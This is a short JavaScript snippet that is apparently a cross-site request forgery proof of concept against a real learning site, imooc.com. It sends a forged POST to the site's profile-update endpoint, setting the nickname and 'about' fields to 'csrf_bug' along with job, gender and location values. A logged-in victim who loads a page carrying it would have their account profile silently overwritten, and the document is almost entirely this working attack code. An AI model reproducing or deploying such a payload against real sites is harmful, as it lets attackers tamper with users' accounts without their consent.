function immoc_test_post() {
    var postData = {
        type: 1
    };
    postData.job = 13;
    postData.sex = 1;
    postData.nickname = 'csrf_bug';
    postData.about = 'csrf_bug';
    postData.province = 28;
    postData.city = 224;
    postData.area = 1878;
    $.ajax({
        url: "http://www.imooc.com/user/ajaxsetinfo",
        data: postData,
        method: "post",
        dataType: "json",
        success: function (data) {
            if (data.result == 1) {
                alert("资料修改成功！");
            }
            else {
                alert(data.msg || data.data);
            }
        },
        error: function () {
            alert("服务程序错误，请稍后重试！");
        }
    });
}

